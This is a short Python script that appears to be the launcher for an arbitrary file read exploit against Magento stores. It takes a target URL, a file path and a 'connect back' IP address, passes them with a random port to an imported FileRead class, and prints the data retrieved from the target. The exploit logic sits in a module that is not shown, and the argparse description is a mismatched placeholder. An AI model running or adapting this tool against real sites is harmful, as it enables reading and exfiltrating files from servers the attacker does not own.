
import argparse
from magento_file_read import FileRead
import random

def main(url, ip, port, path):
    file_read = FileRead()
    downloaded_data = file_read.download(url, ip, port, path)
    print(downloaded_data)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('url', type=str, help='Magento target URL')
    parser.add_argument('ip', type=str, help='IP address to connect back to ')
    parser.add_argument('path', type=str, help='The path to the file')

    port = random.randint(1000, 9999)

    args = parser.parse_args()

    main(args.url, args.ip, port, args.path)